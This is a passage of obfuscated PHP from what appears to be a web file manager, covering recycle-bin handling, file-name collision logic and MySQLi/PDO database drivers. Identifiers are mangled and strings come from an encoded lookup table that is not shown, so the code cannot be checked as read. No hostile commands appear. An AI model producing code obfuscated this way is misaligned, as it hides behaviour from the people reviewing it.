$ÆŒ…˜Õó)); } else { if ($µûÇ€Ê­ == self::TYPE_GROUP) { Model($Ñœé·ğŠ[596])->groupEdit($ùÇËÍ ·, array($Ñœé·ğŠ[1963] => $ÆŒ…˜Õó)); } } } public function targetSpaceSize($¾ºôƒÂ, $—‹õ¹³•) { $µüÔÕ×¬ =& $_SERVER[±³—úê]; $ıŞ¢û† = 0; $ãÀÜÄ® = $this->targetSourceRoot($¾ºôƒÂ, $—‹õ¹³•, !0); foreach ($ãÀÜÄ® as $‘®ø­×ú) { if (!$‘®ø­×ú) { continue; } $ıŞ¢û† += floatval($‘®ø­×ú[$µüÔÕ×¬[79]]); $Å¦ê­à = array($µüÔÕ×¬[666] => array($µüÔÕ×¬[626], $µüÔÕ×¬[604] . $‘®ø­×ú[$µüÔÕ×¬[193]] . $µüÔÕ×¬[627])); $—ÌÄ¤Áı = Model($µüÔÕ×¬[514])->field($µüÔÕ×¬[502])->where($Å¦ê­à)->select(); $—ÌÄ¤Áı = array_to_keyvalue($—ÌÄ¤Áı, $µüÔÕ×¬[12], $µüÔÕ×¬[193]); $—ÌÄ¤Áı = array_unique(array_filter($—ÌÄ¤Áı)); if ($—ÌÄ¤Áı) { $Å¦ê­à = array($µüÔÕ×¬[502] => array($µüÔÕ×¬[503], $—ÌÄ¤Áı)); $ıŞ¢û† += floatval($this->where($Å¦ê­à)->sum($µüÔÕ×¬[79])); } } $ıŞ¢û† = !$ıŞ¢û† || $ıŞ¢û† <= 0 ? 0 : $ıŞ¢û†; return $ıŞ¢û†; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¢–íöÁ£) { return $this->fileTypeProfile($¢–íöÁ£, SourceModel::TYPE_USER); } public function groupFileTypeProfile($±Ûğœïğ) { return $this->fileTypeProfile($±Ûğœïğ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Šı¿½ä, $¦àíõÀĞ) { $È„î¡äÓ =& $_SERVER[±³—úê]; $ê¤è¿¸ = $È„î¡äÓ[2299] . $Šı¿½ä . $È„î¡äÓ[11] . $¦àíõÀĞ; $ÑŞ¬§İ• = Cache::get($ê¤è¿¸); if ($ÑŞ¬§İ•) { return $ÑŞ¬§İ•; } $Í€çé´Ñ = array($È„î¡äÓ[660] => 0); if ($Šı¿½ä != !1) { $Í€çé´Ñ[$È„î¡äÓ[580]] = $Šı¿½ä; $Í€çé´Ñ[$È„î¡äÓ[190]] = $¦àíõÀĞ; } $¡Á™­ãü = array(); $¡Á™­ãü[$È„î¡äÓ[2300]] = array($È„î¡äÓ[2301] => LNG($È„î¡äÓ[2300]), $È„î¡äÓ[2302] => $this->where($Í€çé´Ñ)->count(), $È„î¡äÓ[631] => $this->where($Í€çé´Ñ)->sum($È„î¡äÓ[79])); $ô×ã¹ú = KodIO::fileTypeList(); foreach ($ô×ã¹ú as $ÒİÄÙÄè => $»ä×ÓÁ­) { $Í€çé´Ñ[$È„î¡äÓ[497]] = $this->fileTypeWhere($ÒİÄÙÄè); $¡Á™­ãü[$ÒİÄÙÄè] = array($È„î¡äÓ[2301] => $»ä×ÓÁ­[$È„î¡äÓ[32]], $È„î¡äÓ[2302] => $this->where($Í€çé´Ñ)->count(), $È„î¡äÓ[631] => $this->where($Í€çé´Ñ)->sum($È„î¡äÓ[79])); } Cache::set($ê¤è¿¸, $¡Á™­ãü, 1200); return $¡Á™­ãü; } public function fileNameExist($ı‰‡ºö¯, $ë×‡Í„) { $åœğö‘ù =& $_SERVER[±³—úê]; $Ñî¦ĞŸı = $this->field($åœğö‘ù[2303])->where(array($åœğö‘ù[192] => $ı‰‡ºö¯, $åœğö‘ù[32] => $ë×‡Í„, $åœğö‘ù[516] => 0))->find(); return is_array($Ñî¦ĞŸı) ? $Ñî¦ĞŸı[$åœğö‘ù[193]] : !1; } public function childList($Ú§ú ×ë) { $şãåˆ× =& $_SERVER[±³—úê]; $ùğô’ò© = $şãåˆ×[2276] . $Ú§ú ×ë; if (isset(self::$cacheChildList[$ùğô’ò©])) { return self::$cacheChildList[$ùğô’ò©]; } $Ğè’Š•Ã = array($şãåˆ×[192] => intval($Ú§ú ×ë), $şãåˆ×[516] => 0); $Ñşäé = $this->where($Ğè’Š•Ã)->select(); $Ñşäé = $Ñşäé ? $Ñşäé : array(); self::$cacheChildList[$ùğô’ò©] = $Ñşäé; foreach ($Ñşäé as $µ¬şÎáÇ) { $ùğô’ò© = $şãåˆ×[544] . $µ¬şÎáÇ[$şãåˆ×[193]]; self::$cacheSourceInfo[$ùğô’ò©] = $µ¬şÎáÇ; } return $Ñşäé; } public function fileNameAuto($’™ÛÁó•, $à•Â«Ş€, $‘çÈûÙ = REPEAT_RENAME, $ôì™§åå = false) { $¿ı­¨ç¹ =& $_SERVER[±³—úê]; $ˆ¿íŸˆ” = get_path_ext($à•Â«Ş€); $¶ÕñßïÓ = $ˆ¿íŸˆ” ? get_path_ext_name($à•Â«Ş€) . $¿ı­¨ç¹[2304] . $ˆ¿íŸˆ” : $à•Â«Ş€ . $¿ı­¨ç¹[471]; $Âİ…Ä¿¶ = array($¿ı­¨ç¹[192] => $’™ÛÁó•, $¿ı­¨ç¹[516] => 0, $¿ı­¨ç¹[32] => array($¿ı­¨ç¹[470], $¶ÕñßïÓ)); $–ºØïÑš = $this->field($¿ı­¨ç¹[32])->where($Âİ…Ä¿¶)->select(); $Ø¾‚™‰± = array_to_keyvalue($–ºØïÑš, $¿ı­¨ç¹[12], $¿ı­¨ç¹[32]); return $this->fileNameAutoGet($Ø¾‚™‰±, $à•Â«Ş€, $‘çÈûÙ, $ôì™§åå); } public function fileNameAutoGet($ŸØ¸’ŞÉ, $úœğÆÒÆ, $øú««ë¡, $ÌˆÂºø) { $Œõ£•Œú =& $_SERVER[±³—úê]; if ($øú««ë¡ == REPEAT_REPLACE || !$ŸØ¸’ŞÉ || !in_array_not_case($úœğÆÒÆ, $ŸØ¸’ŞÉ) || $ÌˆÂºø && $øú««ë¡ != REPEAT_RENAME_FOLDER) { return $úœğÆÒÆ; } if ($øú««ë¡ == REPEAT_SKIP) { return !1; } $™÷¶´àÙ = $Œõ£•Œú[10] . get_path_ext($úœğÆÒÆ); $™÷¶´àÙ = $™÷¶´àÙ == $Œõ£•Œú[10] || $ÌˆÂºø ? $Œõ£•Œú[12] : $™÷¶´àÙ; for ($ŒĞùÃ¢· = 1; $ŒĞùÃ¢· <= count($ŸØ¸’ŞÉ) + 1; $ŒĞùÃ¢·++) { $‰Ã¿´Â³ = substr($úœğÆÒÆ, 0, strlen($úœğÆÒÆ) - strlen($™÷¶´àÙ)); $’Ú¯«ç = $‰Ã¿´Â³ . "\50{$ŒĞùÃ¢·}\51{$™÷¶´àÙ}"; if (!in_array_not_case($’Ú¯«ç, $ŸØ¸’ŞÉ)) { return $’Ú¯«ç; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\145\137\162\145\143\171\x63\154\x65"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\x54\151\155\145", "\x74\x69\155\145", "\151\x6e\x73\145\x72\164", "\146\x75\x6e\143\x74\151\157\x6e")); public function listData($„ü§¿™Â = false) { $‹ÒËöò² =& $_SERVER[±³—úê]; $„ü§¿™Â = $„ü§¿™Â ? $„ü§¿™Â : USER_ID; $•ùÍß°Ò = $this->where(array($‹ÒËöò²[1766] => $„ü§¿™Â))->select(); return array_to_keyvalue($•ùÍß°Ò, $‹ÒËöò²[12], $‹ÒËöò²[193]); } public function moveToRecycle($ÜÅÜ¹‡) { $µşãé˜ï =& $_SERVER[±³—úê]; $óß·Œ­û = Model($µşãé˜ï[1423]); $üê·Æ¿ = $óß·Œ­û->sourceInfo($ÜÅÜ¹‡); if (!$üê·Æ¿ || $üê·Æ¿[$µşãé˜ï[516]] == $µşãé˜ï[91]) { return; } $ï·Ê°Å« = array($µşãé˜ï[502] => $ÜÅÜ¹‡, $µşãé˜ï[1766] => USER_ID, $µşãé˜ï[662] => $üê·Æ¿[$µşãé˜ï[190]], $µşãé˜ï[663] => $üê·Æ¿[$µşãé˜ï[580]], $µşãé˜ï[666] => $üê·Æ¿[$µşãé˜ï[595]]); $this->add($ï·Ê°Å«); $this->recycleMove($ÜÅÜ¹‡, 1); if ($üê·Æ¿[$µşãé˜ï[496]] == $µşãé˜ï[91]) { $âª‹ÜÓ± = array($µşãé˜ï[666] => array($µşãé˜ï[626], $üê·Æ¿[$µşãé˜ï[595]] . $ÜÅÜ¹‡ . $µşãé˜ï[627])); $óß·Œ­û->where($âª‹ÜÓ±)->setField($µşãé˜ï[516], 1); } } public function clear() { $this->remove(!1); } public function remove($·Ë¤¿š = false, $ƒÃÆÔ·ã = false) { $„Êİ§™ı =& $_SERVER[±³—úê]; $ƒÃÆÔ·ã = $ƒÃÆÔ·ã ? $ƒÃÆÔ·ã : USER_ID; $œ€¯¢ô„ = Model($„Êİ§™ı[1423]); $¨şì„ÂË = $this->listData($ƒÃÆÔ·ã); $·Ë¤¿š = $·Ë¤¿š === !1 ? !1 : $·Ë¤¿š; $¥¬ó²ã€ = array(); foreach ($¨şì„ÂË as $‰à¹Öµ“) { if ($·Ë¤¿š != !1 && !in_array($‰à¹Öµ“, $·Ë¤¿š)) { continue; } $¸òÛúè¹ = $œ€¯¢ô„->sourceInfo($‰à¹Öµ“); $œ€¯¢ô„->remove($‰à¹Öµ“, !1); $ç‹·Ïæ = $¸òÛúè¹[$„Êİ§™ı[190]] . $„Êİ§™ı[11] . $¸òÛúè¹[$„Êİ§™ı[580]]; $¥¬ó²ã€[$ç‹·Ïæ] = array($„Êİ§™ı[662] => $¸òÛúè¹[$„Êİ§™ı[190]], $„Êİ§™ı[580] => $¸òÛúè¹[$„Êİ§™ı[580]]); $this->where(array($„Êİ§™ı[193] => $‰à¹Öµ“))->delete(); } foreach ($¥¬ó²ã€ as $Á»íÀ¿ä) { $œ€¯¢ô„->targetSpaceUpdate($Á»íÀ¿ä[$„Êİ§™ı[190]], $Á»íÀ¿ä[$„Êİ§™ı[580]]); } } public function restore($‡¿Í½Í± = false) { $ëû¤úÅ¥ = $this->listData(); $this->_restoreSource($ëû¤úÅ¥, $‡¿Í½Í±); } public function removeUserAll($µ„£š”‡) { $this->remove(!1, $µ„£š”‡); } public function restoreItem($¸ª¶ä“) { $this->_restoreSource(array($¸ª¶ä“), array($¸ª¶ä“)); } private function _restoreSource($èÚ´±Æ, $¶şÔ¬¿Æ) { $õî®ëö² =& $_SERVER[±³—úê]; $–áá· = Model($õî®ëö²[1423]); $¶şÔ¬¿Æ = $¶şÔ¬¿Æ == !1 ? !1 : $¶şÔ¬¿Æ; if (!$èÚ´±Æ) { return !0; } $È­å¤åŸ = array(); foreach ($èÚ´±Æ as $ÍÑ²æÂë) { if ($¶şÔ¬¿Æ != !1 && !in_array($ÍÑ²æÂë, $¶şÔ¬¿Æ)) { continue; } $Ş¼¡†±“ = $–áá·->sourceInfo($ÍÑ²æÂë); $èíÒ³£ = $–áá·->sourceInfo($Ş¼¡†±“[$õî®ëö²[192]]); if ($èíÒ³£[$õî®ëö²[516]] == $õî®ëö²[91]) { continue; } $–áá·->lockMoveStart($ÍÑ²æÂë); $this->recycleMove($ÍÑ²æÂë, 0); if ($Ş¼¡†±“[$õî®ëö²[496]] == $õî®ëö²[91]) { $Ğô·ÓÀ¡ = array($õî®ëö²[666] => array($õî®ëö²[626], $Ş¼¡†±“[$õî®ëö²[595]] . $ÍÑ²æÂë . $õî®ëö²[627])); $–áá·->where($Ğô·ÓÀ¡)->setField($õî®ëö²[516], 0); $this->restoreFolderChildren($ÍÑ²æÂë, $èÚ´±Æ); } $this->where(array($õî®ëö²[193] => $ÍÑ²æÂë))->delete(); $–áá·->folderSizeReset($Ş¼¡†±“[$õî®ëö²[192]]); $È­å¤åŸ[] = $Ş¼¡†±“[$õî®ëö²[192]]; if ($Ş¼¡†±“[$õî®ëö²[496]] == $õî®ëö²[91]) { $È­å¤åŸ[] = $ÍÑ²æÂë; } $–áá·->lockMoveEnd($ÍÑ²æÂë); } $–áá·->updateModifyTime($È­å¤åŸ); } private function restoreFolderChildren($èğÉ“ª, $—²ÊµüÉ) { $Î„ÌŠ´ï =& $_SERVER[±³—úê]; $Ï†û”«¡ = Model($Î„ÌŠ´ï[1423]); $ÓŒ¬ş = array($Î„ÌŠ´ï[193] => array($Î„ÌŠ´ï[7], array())); foreach ($—²ÊµüÉ as $Ë­¿˜‹¤) { if ($Ë­¿˜‹¤ == $èğÉ“ª) { continue; } if (!$Ï†û”«¡->isParentOf($èğÉ“ª, $Ë­¿˜‹¤)) { continue; } $¯šİ­Œå = $Ï†û”«¡->sourceInfo($Ë­¿˜‹¤); if ($¯šİ­Œå[$Î„ÌŠ´ï[496]] == $Î„ÌŠ´ï[91]) { $ÓŒ¬ş[] = array($Î„ÌŠ´ï[666] => array($Î„ÌŠ´ï[626], $¯šİ­Œå[$Î„ÌŠ´ï[595]] . $Ë­¿˜‹¤ . $Î„ÌŠ´ï[627])); } else { $ÓŒ¬ş[$Î„ÌŠ´ï[193]][1][] = $Ë­¿˜‹¤; } } if (!$ÓŒ¬ş[$Î„ÌŠ´ï[193]][1]) { unset($ÓŒ¬ş[$Î„ÌŠ´ï[193]]); } if (!$ÓŒ¬ş) { return; } if (is_array($ÓŒ¬ş[$Î„ÌŠ´ï[193]]) && is_array($ÓŒ¬ş[$Î„ÌŠ´ï[193]][1])) { $ÓŒ¬ş[$Î„ÌŠ´ï[193]][1] = array_unique($ÓŒ¬ş[$Î„ÌŠ´ï[193]][1]); } $ÓŒ¬ş[$Î„ÌŠ´ï[1079]] = $Î„ÌŠ´ï[2077]; $Ï†û”«¡->where($ÓŒ¬ş)->setField($Î„ÌŠ´ï[516], 1); } private function recycleMove($œÆÑ‹•Ğ, $’•Šş¥Â = 1) { $Ää¦™ƒ« =& $_SERVER[±³—úê]; $ôì¼òó = Model($Ää¦™ƒ«[1423]); $öœÙø„Ç = Model($Ää¦™ƒ«[2305]); $Á¸ƒÊŞ‘ = array($Ää¦™ƒ«[193] => $œÆÑ‹•Ğ); if ($’•Šş¥Â) { $ôì¼òó->where($Á¸ƒÊŞ‘)->setField($Ää¦™ƒ«[516], 1); $öœÙø„Ç->eventRecycle($œÆÑ‹•Ğ, $Ää¦™ƒ«[2306]); } else { $›…¤ªœß = $ôì¼òó->where($Á¸ƒÊŞ‘)->find(); $ëóè—Ò­ = $›…¤ªœß[$Ää¦™ƒ«[496]] == $Ää¦™ƒ«[91]; $‚·ô “ = $ôì¼òó->fileNameAuto($›…¤ªœß[$Ää¦™ƒ«[192]], $›…¤ªœß[$Ää¦™ƒ«[32]], REPEAT_RENAME_FOLDER, $ëóè—Ò­); if ($‚·ô “ != $›…¤ªœß[$Ää¦™ƒ«[32]]) { $ôì¼òó->rename($œÆÑ‹•Ğ, $‚·ô “); } $ôì¼òó->where($Á¸ƒÊŞ‘)->setField($Ää¦™ƒ«[516], 0); $öœÙø„Ç->eventRecycle($œÆÑ‹•Ğ, $Ää¦™ƒ«[2307]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\x73\x6f\165\162\143\x65\x53\x65\x63\x72\145\x74\x4c\x69\163\164"; public $field = array("\163\157\165\162\x63\x65\111\104", "\164\x79\x70\x65\x49\104", "\143\162\x65\141\164\145\125\163\x65\x72"); } goto fÜËºÆÒãÔ; E„ˆÓ»ì : class DbMysqli extends Db { public function __construct($‹€È»¸• = '') { $°òÂï‘ë =& $_SERVER[±³—úê]; if (!extension_loaded($°òÂï‘ë[991])) { think_exception(think_lang($°òÂï‘ë[14]) . $°òÂï‘ë[992]); } if (!empty($‹€È»¸•)) { $this->config = $‹€È»¸•; if (empty($this->config[$°òÂï‘ë[17]])) { $this->config[$°òÂï‘ë[17]] = $°òÂï‘ë[12]; } } } public function connect($½Ú©åÂÛ = '', $êó®Éµ³ = 0) { $ÉÚÒÀ‘… =& $_SERVER[±³—úê]; if (!isset($this->linkID[$êó®Éµ³])) { if (empty($½Ú©åÂÛ)) { $½Ú©åÂÛ = $this->config; } $this->linkID[$êó®Éµ³] = new mysqli($½Ú©åÂÛ[$ÉÚÒÀ‘…[965]], $½Ú©åÂÛ[$ÉÚÒÀ‘…[967]], $½Ú©åÂÛ[$ÉÚÒÀ‘…[968]], $½Ú©åÂÛ[$ÉÚÒÀ‘…[21]], $½Ú©åÂÛ[$ÉÚÒÀ‘…[966]] ? intval($½Ú©åÂÛ[$ÉÚÒÀ‘…[966]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ï»®—¸ = $this->linkID[$êó®Éµ³]->server_version; $this->linkID[$êó®Éµ³]->query($ÉÚÒÀ‘…[969] . think_config($ÉÚÒÀ‘…[970]) . $ÉÚÒÀ‘…[58]); if ($ï»®—¸ > $ÉÚÒÀ‘…[971]) { $this->linkID[$êó®Éµ³]->query($ÉÚÒÀ‘…[972]); } $this->connected = !0; if (1 != think_config($ÉÚÒÀ‘…[22])) { unset($this->config); } } return $this->linkID[$êó®Éµ³]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ßãÈåò) { $Ç®³€Àø =& $_SERVER[±³—úê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßãÈåò; if ($this->queryID) { $this->free(); } think_action_status($Ç®³€Àø[23], 1); think_status($Ç®³€Àø[24]); $this->queryID = $this->_linkID->query($ßãÈåò); if ($this->_linkID->more_results()) { while (($¥å­õÏñ = $this->_linkID->next_result()) != NULL) { $¥å­õÏñ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÁööŒ¤”) { $¬·™˜³¼ =& $_SERVER[±³—úê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁööŒ¤”; if ($this->queryID) { $this->free(); } think_action_status($¬·™˜³¼[25], 1); think_status($¬·™˜³¼[24]); $½ïøİ‰ë = $this->_linkID->query($ÁööŒ¤”); $this->debug(); if (!1 === $½ïøİ‰ë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $™˜’Óå­ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$™˜’Óå­) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‹¶°ÅÕ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‹¶°ÅÕ) { $this->error(); return !1; } } return !0; } private function getAll() { $ªáã¥¢ñ = array(); if ($this->numRows > 0) { for ($Ñ±ìõ‡ = 0; $Ñ±ìõ‡ < $this->numRows; $Ñ±ìõ‡++) { $ªáã¥¢ñ[$Ñ±ìõ‡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ªáã¥¢ñ; } public function getFields($©¬Õ·‡Ö) { $ğ¢×üÍ° =& $_SERVER[±³—úê]; $ÈäÎœ®Î = $this->query($ğ¢×üÍ°[976] . $this->parseKey($©¬Õ·‡Ö)); $ìÓ½ÑÙ€ = array(); if ($ÈäÎœ®Î) { foreach ($ÈäÎœ®Î as $œ¿Ïúá¶ => $ÒÑÙõ€Í) { $ìÓ½ÑÙ€[$ÒÑÙõ€Í[$ğ¢×üÍ°[31]]] = array($ğ¢×üÍ°[32] => $ÒÑÙõ€Í[$ğ¢×üÍ°[31]], $ğ¢×üÍ°[33] => $ÒÑÙõ€Í[$ğ¢×üÍ°[34]], $ğ¢×üÍ°[35] => (bool) ($ÒÑÙõ€Í[$ğ¢×üÍ°[36]] === $ğ¢×üÍ°[12]), $ğ¢×üÍ°[37] => $ÒÑÙõ€Í[$ğ¢×üÍ°[38]], $ğ¢×üÍ°[39] => strtolower($ÒÑÙõ€Í[$ğ¢×üÍ°[40]]) == $ğ¢×üÍ°[41], $ğ¢×üÍ°[42] => strtolower($ÒÑÙõ€Í[$ğ¢×üÍ°[43]]) == $ğ¢×üÍ°[44]); } } return $ìÓ½ÑÙ€; } public function getTables($îÑƒ…åã = '') { $Ñ•ìı˜“ =& $_SERVER[±³—úê]; $Ñ£ú¼ƒ = !empty($îÑƒ…åã) ? $Ñ•ìı˜“[978] . $îÑƒ…åã . $Ñ•ìı˜“[979] : $Ñ•ìı˜“[980]; $âŠÄ€© = $this->query($Ñ£ú¼ƒ); $åÍ´¸ÈĞ = array(); if ($âŠÄ€©) { foreach ($âŠÄ€© as $Ç“½êÊ => $Ñ¿‚×–—) { $åÍ´¸ÈĞ[$Ç“½êÊ] = current($Ñ¿‚×–—); } } return $åÍ´¸ÈĞ; } public function replace($¾ú”üÈÊ, $öÅ¼™ƒØ = array()) { $´ÂÃõ´ =& $_SERVER[±³—úê]; foreach ($¾ú”üÈÊ as $é•õÎŒ => $Äèİˆ…Ö) { $É½×ñÇª = $this->parseValue($Äèİˆ…Ö); if (is_scalar($É½×ñÇª)) { $ğÌˆêéß[] = $É½×ñÇª; $ı‘ò®¼Î[] = $this->parseKey($é•õÎŒ); } } $üšâ¸ú¯ = $´ÂÃõ´[981] . $this->parseTable($öÅ¼™ƒØ[$´ÂÃõ´[367]]) . $´ÂÃõ´[982] . implode($´ÂÃõ´[50], $ı‘ò®¼Î) . $´ÂÃõ´[983] . implode($´ÂÃõ´[50], $ğÌˆêéß) . $´ÂÃõ´[984]; return $this->execute($üšâ¸ú¯); } public function insertAll($¹úøÚ§, $ çì§­ = array(), $˜õ˜Èì« = false) { $¨ê×ÑÚÕ =& $_SERVER[±³—úê]; if (!is_array($¹úøÚ§[0])) { return !1; } $‹ÎØÏÎ… = array_keys($¹úøÚ§[0]); $í»†Ÿ¬¦ = array(); foreach ($¹úøÚ§ as $à œÆÂ) { $ÁñÕ÷¤ = array(); foreach ($à œÆÂ as $…â»Í‘Ì => $”÷æá¯ã) { $”÷æá¯ã = $this->parseValue($”÷æá¯ã); if (is_scalar($”÷æá¯ã)) { $ÁñÕ÷¤[] = $”÷æá¯ã; } } $í»†Ÿ¬¦[] = $¨ê×ÑÚÕ[348] . implode($¨ê×ÑÚÕ[50], $ÁñÕ÷¤) . $¨ê×ÑÚÕ[984]; } array_walk($‹ÎØÏÎ…, array($this, $¨ê×ÑÚÕ[985])); $Áü…ÃÖ¸ = $˜õ˜Èì« ? $¨ê×ÑÚÕ[986] : $¨ê×ÑÚÕ[987]; $½ìø‹èç = $Áü…ÃÖ¸ . $¨ê×ÑÚÕ[988] . $this->parseTable($ çì§­[$¨ê×ÑÚÕ[367]]) . $¨ê×ÑÚÕ[982] . implode($¨ê×ÑÚÕ[50], $‹ÎØÏÎ…) . $¨ê×ÑÚÕ[989] . implode($¨ê×ÑÚÕ[50], $í»†Ÿ¬¦); return $this->execute($½ìø‹èç); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $µÊüçÉ› =& $_SERVER[±³—úê]; $this->error = $this->_linkID->errno . $µÊüçÉ›[4] . $this->_linkID->error; if ($µÊüçÉ›[12] != $this->queryStr) { $this->error .= LNG($µÊüçÉ›[48]) . $this->queryStr; } think_trace($this->error, $µÊüçÉ›[12], $µÊüçÉ›[49]); return $this->error; } public function escapeString($Âë ‹ÇÔ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Âë ‹ÇÔ); } else { return addslashes($Âë ‹ÇÔ); } } public function parseKey(&$»«ˆğ, $ÁÖåï€ = true) { $İòúëË =& $_SERVER[±³—úê]; if ($ÁÖåï€) { $»«ˆğ = $this->parseKeyCheck($»«ˆğ); } if ($»«ˆğ != $İòúëË[232] && !preg_match($İòúëË[990], $»«ˆğ)) { $»«ˆğ = $İòúëË[472] . trim($»«ˆğ, $İòúëË[472]) . $İòúëË[472]; } return $»«ˆğ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($“âº¶…ö = '') { $‚­°©ïÒ =& $_SERVER[±³—úê]; if (!class_exists($‚­°©ïÒ[993])) { think_exception(think_lang($‚­°©ïÒ[14]) . $‚­°©ïÒ[994]); } if (!empty($“âº¶…ö)) { $this->config = $“âº¶…ö; if (empty($this->config[$‚­°©ïÒ[17]])) { $this->config[$‚­°©ïÒ[17]] = array(); } } } public function connect($ò»ó‚¹£ = '', $Ëè–µ‚ = 0) { $©Ò•–¾† =& $_SERVER[±³—úê]; if (!isset($this->linkID[$Ëè–µ‚])) { if (empty($ò»ó‚¹£)) { $ò»ó‚¹£ = $this->config; } $Ï†ãàÏÏ = !empty($ò»ó‚¹£[$©Ò•–¾†[17]][$©Ò•–¾†[18]]) ? $ò»ó‚¹£[$©Ò•–¾†[17]][$©Ò•–¾†[18]] : $this->pconnect; if ($Ï†ãàÏÏ) { $ò»ó‚¹£[$©Ò•–¾†[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ëè–µ‚] = new PDO($ò»ó‚¹£[$©Ò•–¾†[995]], $ò»ó‚¹£[$©Ò•–¾†[967]], $ò»ó‚¹£[$©Ò•–¾†[968]], $ò»ó‚¹£[$©Ò•–¾†[17]]); } catch (PDOException $™Ù–ÃùŞ) { think_exception($™Ù–ÃùŞ->getMessage()); } $this->dbType = $this->_getDsnType($ò»ó‚¹£[$©Ò•–¾†[995]]); if (in_array($this->dbType, array($©Ò•–¾†[996], $©Ò•–¾†[997], $©Ò•–¾†[998], $©Ò•–¾†[999]))) { think_exception($©Ò•–¾†[1000] . $this->dbType . $©Ò•–¾†[1001] . $this->dbType . $©Ò•–¾†[1002]); } if (!$this->linkID[$Ëè–µ‚]) { think_exception($©Ò•–¾†[1003]); } try { $this->linkID[$Ëè–µ‚]->exec($©Ò•–¾†[1004] . think_config($©Ò•–¾†[970])); } catch (Exception $™Ù–ÃùŞ) { } $this->connected = !0; if (1 != think_config($©Ò•–¾†[22])) { unset($this->config); } } return $this->linkID[$Ëè–µ‚]; } public function free() { $this->PDOStatement = null; } public function query($ª¯ĞÅ¨§, $éÍ’Üµ´ = array()) { $‹ˆ½ıï¢ =& $_SERVER[±³—úê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ª¯ĞÅ¨§; if (!empty($éÍ’Üµ´)) { $this->queryStr .= $‹ˆ½ıï¢[1005] . print_r($éÍ’Üµ´, !0) . $‹ˆ½ıï¢[1006]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‹ˆ½ıï¢[23], 1); think_status($‹ˆ½ıï¢[24]); $this->PDOStatement = $this->_linkID->prepare($ª¯ĞÅ¨§); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $•»‰‚ëå = $this->PDOStatement->execute($éÍ’Üµ´); $this->debug(); if (!1 === $•»‰‚ëå) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÁÅ£¤‰Œ, $­òàÈß™ = array()) { $áÏ ®±¼ =& $_SERVER[±³—úê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁÅ£¤‰Œ; if (!empty($­òàÈß™)) { $this->queryStr .= $áÏ ®±¼[1005] . print_r($­òàÈß™, !0) . $áÏ ®±¼[1006]; } $øÅ»Öˆ = !1; if ($this->dbType == $áÏ ®±¼[999]) { if (preg_match($áÏ ®±¼[1007], $this->queryStr, $‚ÏÎÄ˜Ã)) { $this->table = think_config($áÏ ®±¼[1008]) . str_ireplace(think_config($áÏ ®±¼[1009]), $áÏ ®±¼[465], $‚ÏÎÄ˜Ã[2]); $øÅ»Öˆ = (bool) $this->query($áÏ ®±¼[1010] . strtoupper($this->table) . $áÏ ®±¼[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($áÏ ®±¼[25], 1); think_status($áÏ ®±¼[24]); $this->PDOStatement = $this->_linkID->prepare($ÁÅ£¤‰Œ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¢Áï¦÷ = $this->PDOStatement->execute($­òàÈß™); $this->debug(); if (!1 === $¢Áï¦÷) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($øÅ»Öˆ || preg_match($áÏ ®±¼[1011], $ÁÅ£¤‰Œ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $§¡ç °¬ = $this->_linkID->commit(); $this->transTimes = 0; if (!$§¡ç °¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $×Å¢€Ÿ¦ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$×Å¢€Ÿ¦) { $this->error(); return !1; } } return !0; } private function getAll() { $İíøúİÀ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($İíøúİÀ); return $İíøúİÀ; } public function getFields($±¤Â€ä–) { $ÎÖ¬¢ô =& $_SERVER[±³—úê]; $this->initConnect(!0); if (think_config($ÎÖ¬¢ô[1012])) { $Î¹–©À¥ = str_replace($ÎÖ¬¢ô[1013], $±¤Â€ä–, think_config($ÎÖ¬¢ô[1012])); } else { switch ($this->dbType) { case $ÎÖ¬¢ô[996]: case $ÎÖ¬¢ô[1014]: $Î¹–©À¥ = 